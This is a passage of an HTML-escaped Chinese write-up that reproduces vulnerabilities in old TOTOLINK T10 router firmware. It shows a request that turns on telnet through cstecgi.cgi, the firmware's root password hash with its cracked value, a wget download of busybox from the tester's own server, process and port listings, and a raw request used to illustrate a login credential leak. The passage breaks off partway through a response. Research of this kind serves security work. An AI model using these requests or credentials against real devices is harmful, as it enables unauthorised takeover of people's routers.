class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;quot;topicurl&amp;quot;:&amp;quot;setting/setTelnetCfg&amp;quot;,&amp;quot;telnet_enabled&amp;quot;:&amp;quot;1&amp;quot;&amp;#125;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;2-2-password获取&#34;&gt;&lt;a href=&#34;#2-2-password获取&#34; class=&#34;headerlink&#34; title=&#34;2.2 password获取&#34;&gt;&lt;/a&gt;2.2 password获取&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(base) ➜  squashfs-root cat etc/shadow.sample&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:&lt;span class=&#34;number&#34;&gt;16090&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;99999&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;:::&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nobody:*:&lt;span class=&#34;number&#34;&gt;14495&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;99999&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;:::&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		解密结果是cs2012&lt;/p&gt;
&lt;h1 id=&#34;三、框架分析&#34;&gt;&lt;a href=&#34;#三、框架分析&#34; class=&#34;headerlink&#34; title=&#34;三、框架分析&#34;&gt;&lt;/a&gt;三、框架分析&lt;/h1&gt;&lt;h2 id=&#34;3-1-目录梳理&#34;&gt;&lt;a href=&#34;#3-1-目录梳理&#34; class=&#34;headerlink&#34; title=&#34;3.1 目录梳理&#34;&gt;&lt;/a&gt;3.1 目录梳理&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;--bin					二进制文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--lib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --cste_modules  	.so库文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--web_cste    			浏览器web后台主目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	--adm				管理员后台&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --cgi-bin			功能处理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --firewall    		防火墙功能&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	login.asp			登陆页面&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    telnet.asp			telnet控制页面&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;进去之后	 进行信息收集, 先传一个busybox-mipsel&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server &lt;span class=&#34;number&#34;&gt;80&lt;/span&gt; 起一个服务,传一下&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http:&lt;span class=&#34;comment&#34;&gt;//xxxxxxxx/busybox-mipsel&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		收集进程信息&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1028&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; udhcpd /var/udhcpd.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1269&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; ppp_inet -t &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; -c &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; -x&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1279&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; dnsmasq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1285&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; lld2d br0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1301&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; fwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1329&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; cs_broker -c /etc/mosquitto.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1335&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; cste_sub -h &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt; -t totolink/router/#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1352&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; telnetd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1360&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; csteDriverConnMachine&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1365&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; crond&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1366&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; [kworker/&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;H]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1376&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; lighttpd -f /lighttp/lighttpd.conf -m /lighttp/lib/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1398&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; /bin/getty -L ttyS0 &lt;span class=&#34;number&#34;&gt;38400&lt;/span&gt; vt100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1400&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; watchdog -c /var/cs_watchdog.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1924&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; -sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2178&lt;/span&gt; root       &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; ./busybox-mipsel ps auxf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		网络信息&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# ./busybox-mipsel netstat -alp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Active Internet &lt;span class=&#34;title function_&#34;&gt;connections&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(servers and established)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      1376/lighttpd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        0      0 0.0.0.0:domain          0.0.0.0:*               LISTEN      1279/dnsmasq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        0      0 0.0.0.0:telnet          0.0.0.0:*               LISTEN      1352/telnetd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        0      0 0.0.0.0:1883            0.0.0.0:*               LISTEN      1329/cs_broker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        0      0 127.0.0.1:1883          127.0.0.1:56383         ESTABLISHED 1329/cs_broker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        0      0 127.0.0.1:56383         127.0.0.1:1883          ESTABLISHED 1335/cste_sub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp        0    157 router.totolink.com:telnet 192.168.55.3:62063      ESTABLISHED 1352/telnetd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat: /proc/net/tcp6: No such file or directory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;udp        0      0 0.0.0.0:domain          0.0.0.0:*                           1279/dnsmasq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;udp        0      0 0.0.0.0:bootps          0.0.0.0:*                           1028/udhcpd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat: /proc/net/udp6: No such file or directory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat: /proc/net/raw6: No such file or directory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Active UNIX domain &lt;span class=&#34;title function_&#34;&gt;sockets&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(servers and established)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unix  3      [ ]         STREAM     CONNECTED       1590 1335/cste_sub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unix  3      [ ]         STREAM     CONNECTED       1282 1028/udhcpd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unix  3      [ ]         STREAM     CONNECTED       1591 1335/cste_sub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unix  3      [ ]         STREAM     CONNECTED       1283 1028/udhcpd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unix  2      [ ]         DGRAM                      1488 1279/dnsmasq&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;四、逻辑功能、业务流程梳理&#34;&gt;&lt;a href=&#34;#四、逻辑功能、业务流程梳理&#34; class=&#34;headerlink&#34; title=&#34;四、逻辑功能、业务流程梳理&#34;&gt;&lt;/a&gt;四、逻辑功能、业务流程梳理&lt;/h1&gt;&lt;h2 id=&#34;4-1-登陆&#34;&gt;&lt;a href=&#34;#4-1-登陆&#34; class=&#34;headerlink&#34; title=&#34;4.1 登陆&#34;&gt;&lt;/a&gt;4.1 登陆&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230513200756944.png&#34; alt=&#34;image-20230513200756944&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		formLoginAuth.htm 这个东西其实在lighttpd里面, 它只是一个变量名,不代表文件,判断这个文件名,会调用Form_Login函数&lt;/p&gt;
&lt;h3 id=&#34;4-1-1-密码泄露&#34;&gt;&lt;a href=&#34;#4-1-1-密码泄露&#34; class=&#34;headerlink&#34; title=&#34;4.1.1 密码泄露&#34;&gt;&lt;/a&gt;4.1.1 密码泄露&lt;/h3&gt;&lt;p&gt;这个请求包存在一个问题,即不论用户名密码是否正确,都调用它,然后返回前端,于是就有了一个用户名密码泄露漏洞&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /cgi-bin/cstecgi.cgi HTTP/&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded; charset=UTF&lt;span class=&#34;number&#34;&gt;-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: *&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Referer: http://192.168.0.1/title.asp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Accept-Language: zh-Hans-CN,zh-Hans;q=0.5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Content-Length: 37&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Host: 192.168.0.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Pragma: no-cache&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Cookie: SESSION_ID=2:1516657290:2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Connection: close&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&amp;#123;&amp;quot;topicurl&amp;quot;:&amp;quot;setting/getLanguageCfg&amp;quot;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;HTTP/1.1 200 OK&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Connection: close&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Content-Length: 340&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Pragma: no-cache&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Cache-Control: no-cache&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Date: Mon, 22 Jan 2018 21:36:50 GMT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Server: lighttpd/1.4.20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;operationMode&amp;quot;:	0,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;loginFlag&amp;quot;:	1,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;multiLangBt&amp;quot;:	1,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;helpBt&amp;quot;:	1,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;fmVersion&amp;quot;:	&amp;quot;V5.9c.1485&amp;quot;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;title&amp;quot;:	&amp;quot;TOTOLINK&amp;quot;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;langFlag&amp;quot;:	0,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;languageType&amp;quot;:	&amp;quot;cn&amp;quot;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	&amp;quot;helpUrl&amp;quot;:	